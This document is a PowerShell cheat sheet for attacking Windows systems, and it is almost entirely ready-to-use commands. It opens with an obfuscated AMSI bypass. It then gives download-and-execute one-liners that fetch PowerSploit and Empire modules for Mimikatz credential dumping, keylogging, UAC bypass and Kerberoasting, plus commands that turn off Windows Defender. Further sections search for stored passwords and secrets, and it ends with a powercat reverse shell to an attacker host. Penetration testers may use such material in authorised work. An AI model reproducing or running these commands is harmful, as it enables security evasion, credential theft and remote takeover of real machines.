1. powershell -ep bypass
2. AMSI Bypass
```
s**ET-ItEM ( ‘V’+’aR’ + ‘IA’ + ‘blE:1q2’ + ‘uZx’ ) ( [TYpE]( “{1}{0}”-F’F’,’rE’ ) ) ; ( GeT-VariaBle ( “1Q2U” +”zX” ) -VaL ).”A`ss`Embly”.”GET`TY`Pe”(( “{6}{3}{1}{4}{2}{0}{5}” -f’Util’,’A’,’Amsi’,’.Management.’,’utomation.’,’s’,’System’ ) ).”g`etf`iElD”( ( “{0}{2}{1}” -f’amsi’,’d’,’InitFaile’ ),( “{2}{4}{0}{1}{3}” -f ‘Stat’,’i’,’NonPubli’,’c’,’c,’ )).”sE`T`VaLUE”( ${n`ULl},${t`RuE} )**
```
3. import the module.

##### Allow Script Execution
```powershell
Set-ExecutionPolicy remotesigned
Set-ExecutionPolicy unrestricted
```

##### Import Module to PowerShell cmdlet
```powershell
## Load from disk
powershell -exec bypass
import-module file.ps1
```

##### Check PowerShell Versions
```powershell
Set-ExecutionPolicy Unrestricted
powershell -Command "$PSVersionTable.PSVersion"
powershell -c "[Environment]::Is64BitProcess"
```

##### Transfer Files
```powershell
## -UseBasicParsing parameter stops explorer from opening the browser.
Invoke-Webrequest -UseBasicParsing 0.0.0.0:8000/mimikatz.ps1 -OutFile filename.ps1

IEX(New-Object Net.WebClient).DownloadString(‘http://<0.0.0.0>/PowerUp.ps1’)

## pwsh versio 3 and above
iex (iwr 'http://<0.0.0.0>/PowerUp.ps1')
```

## Pwsh in Memory Injection
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1');

IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellMafia/PowerSploit/master/Exfiltration/Out-Minidump.ps1')

IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellMafia/PowerSploit/master/Exfiltration/Get-VaultCredential.ps1'); Get-VaultCredential

IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1')

# Invoke-BypassUAC and start PowerShell prompt as Administrator [Or replace to run any other command]
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/EmpireProject/Empire/master/data/module_source/privesc/Invoke-BypassUAC.ps1');Invoke-BypassUAC -Command 'start powershell.exe'"

# Invoke-Mimikatz: Dump credentials from memory
powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"

# Import Mimikatz Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')"

# Invoke-MassMimikatz: Use to dump creds on remote host [replace $env:computername with target server name(s)]
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellEmpire/PowerTools/master/PewPewPew/Invoke-MassMimikatz.ps1');'$env:COMPUTERNAME'|Invoke-MassMimikatz -Verbose"

# PowerUp: Privilege escalation checks
powershell.exe -exec Bypass -C “IEX (New-Object Net.WebClient).DownloadString(‘http://0.0.0.0/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1’);Invoke-AllChecks”

# Invoke-Kerberoast and provide Hashcat compatible hashes
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1');Invoke-kerberoast -OutputFormat Hashcat"

# Invoke-ShareFinder and print output to file
powershell.exe -exec Bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1');Invoke-ShareFinder -CheckShareAccess|Out-File -FilePath sharefinder.txt"

# Import PowerView Module to run further commands
powershell.exe -exec Bypass -noexit -C "IEX (New-Object Net.WebClient).DownloadString('http://0.0.0.0/PowerShellEmpire/PowerTools/master/PowerView/powerview.ps1')"

# Invoke-Bloodhound
powershell.exe -exec Bypass -C "IEX(New-Object Net.Webclient).DownloadString('http://0.0.0.0/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1');Invoke-BloodHound"

# Find GPP Passwords in SYSVOL
findstr /S cpassword $env:logonserver\sysvol\*.xml
findstr /S cpassword %logonserver%\sysvol\*.xml (cmd.exe)

# Run Powershell prompt as a different user, without loading profile to the machine [replace DOMAIN and USER]
runas /user:DOMAIN\USER /noprofile powershell.exe
```

##### Antivirusss
```powershell
## Disable Windows Defender real time monitoring if SYSTEM
Set-MpPreference -DisableRealTimeMonitoring $true

## Disable Windows Defender scanning for all files downloaded
Set-MpPreference -DisableIOAVProtection $true
```

##### Powerview Domain Enumeration
```powershell
## Get basic information of the domain
Get-NetDomain -Domain <target>

## Get the domains' SID
Get-DomainSID

## Get list of domain controllers
Get-NetDomainController -Domain <target>
```

##### Finding Passwords
```powershell
## Reading the Powershell history (default location)
cat $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

## Find Powershell history if not in \users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
Get-PSReadlineOption

## Search registry for auto-logon credentials
gp 'HKLM:\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon' | select "Default*"

## Get stored passwords from Windows Credential Manager
Get-StoredCredential | % { write-host -NoNewLine $_.username; write-host -NoNewLine ":" ; $p = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_.password) ; [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($p); }

## Get stored passwords from Windows PasswordVault
[Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime];(New-Object Windows.Security.Credentials.PasswordVault).RetrieveAll() | % { $_.RetrievePassword();$_ }

## Locate web server configuration files
gci c:\ -Include web.config,applicationHost.config,php.ini,httpd.conf,httpd-xampp.conf,my.ini,my.cnf -File -Recurse -EA SilentlyContinue

## Find database credentials in configuration files
gci c:\ -Include *.config,*.conf,*.xml -File -Recurse -EA SilentlyContinue | Select-String -Pattern "connectionString"

## Find configuration files containing “password” string
gci c:\ -Include *.txt,*.xml,*.config,*.conf,*.cfg,*.ini -File -Recurse -EA SilentlyContinue | Select-String -Pattern "password"

## Find credentials in Sysprep or Unattend files
gci c:\ -Include *sysprep.inf,*sysprep.xml,*sysprep.txt,*unattended.xml,*unattend.xml,*unattend.txt -File -Recurse -EA SilentlyContinue

## Locating files with sensitive information
gci c:\ -Include *pass*.txt,*pass*.xml,*pass*.ini,*pass*.xlsx,*cred*,*vnc*,*.config*,*accounts* -File -Recurse -EA SilentlyContinue

```

##### Reverse shell
```powerhsell
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e cmd"
```
